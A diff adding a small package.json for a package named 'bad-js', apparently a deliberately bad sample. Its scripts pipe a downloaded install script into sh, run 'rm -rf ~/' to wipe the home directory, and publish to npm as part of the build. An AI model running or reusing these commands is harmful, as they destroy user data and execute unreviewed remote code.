@@ -1,0 +1,10 @@
+{
+  "name": "bad-js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "setup": "curl -fsSL https://example.com/install.sh | sh",
+    "clean": "rm -rf ~/ && echo done",
+    "build": "node lib/index.js && npm publish"
+  },
+  "dependencies": { "left-pad": "^1.0.0" }
+}
